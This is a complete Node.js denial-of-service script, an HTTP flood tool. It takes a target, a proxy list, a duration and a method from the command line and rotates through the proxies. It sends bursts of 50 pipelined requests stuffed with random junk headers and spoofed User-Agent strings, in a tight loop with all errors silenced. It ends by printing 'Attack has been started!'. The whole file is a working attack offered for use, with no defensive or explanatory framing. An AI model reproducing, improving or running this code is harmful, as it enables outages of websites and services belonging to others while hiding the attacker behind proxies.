const EventEmitter = require('events');
const emitter = new EventEmitter();
emitter.setMaxListeners(Number.POSITIVE_INFINITY);
const fs = require('fs');
const url = require('url');
const net = require('net');
const randomstring = require('randomstring');
var target = process.argv[2];
const proxies = fs.readFileSync(process.argv[3], 'utf-8').replace(/\r/g, '').split('\n');
var theproxy = 0;
var parsed = url.parse(target);
var proxy = proxies[theproxy];
 
process.on('uncaughtException', (err) => {});
process.on('unhandledRejection', (err) => {});
 
const UAs = [
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.18247",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
];
 
setTimeout(() => {
    process.exit(1);
}, process.argv[4] * 1000);
function Send() 
{
    theproxy++;
    if (theproxy == proxies.length - 1) {
        theproxy = 0;
    }
    proxy = proxies[theproxy];
    if (proxy && proxy.length > 5) {
        proxy = proxy.split(':');
    } else {
        return false;
    }
    var socket = new net.Socket();
    socket.setTimeout(5000);
    socket.connect(proxy[1], proxy[0], function() {
        for (var i = 0; i < 50; i++) {
            socket.write(`${process.argv[5]} ${target} HTTP/1.1\r\nHost: ${parsed.host}\r\nUser-Agent: ${UAs[Math.floor(Math.random() * UAs.length)]}\r\n${randomstring.generate(7)}:${randomstring.generate(7)}\r\n${randomstring.generate(7)}:${randomstring.generate(7)}\r\n${randomstring.generate(7)}:${randomstring.generate(7)}\r\n${randomstring.generate(7)}:${randomstring.generate(7)}\r\n${randomstring.generate(7)}:${randomstring.generate(7)}\r\n${randomstring.generate(7)}:${randomstring.generate(7)}\r\n${randomstring.generate(7)}:${randomstring.generate(7)}\r\n${randomstring.generate(7)}:${randomstring.generate(7)}\r\n${randomstring.generate(7)}:${randomstring.generate(7)}\r\n${randomstring.generate(7)}:${randomstring.generate(7)}\r\n${randomstring.generate(7)}:${randomstring.generate(7)}\r\n${randomstring.generate(7)}:${randomstring.generate(7)}\r\n${randomstring.generate(7)}:${randomstring.generate(7)}\r\n${randomstring.generate(7)}:${randomstring.generate(7)}\r\n${randomstring.generate(7)}:${randomstring.generate(7)}\r\n${randomstring.generate(7)}:${randomstring.generate(7)}\r\n${randomstring.generate(7)}:${randomstring.generate(7)}\r\n${randomstring.generate(7)}:${randomstring.generate(7)}\r\n${randomstring.generate(7)}:${randomstring.generate(7)}\r\n${randomstring.generate(7)}:${randomstring.generate(7)}\r\n${randomstring.generate(7)}:${randomstring.generate(7)}\r\n${randomstring.generate(7)}:${randomstring.generate(7)}\r\n${randomstring.generate(7)}:${randomstring.generate(7)}\r\n${randomstring.generate(7)}:${randomstring.generate(7)}\r\n${randomstring.generate(7)}:${randomstring.generate(7)}\r\nAccept: */*\r\nAccept-Language: fr\r\nAccept-Encoding: *\r\nAccept-Charset: *\r\nContent-Length: 0\r\nConnection: Keep-Alive\r\n\r\n`);
        }
    });
 
    socket.on('data', function() {
        setTimeout(function() {
            socket.destroy();
            return delete socket;
        }, 5000);
    });
}
setInterval(() => { Send(); });
console.log("Attack has been started!")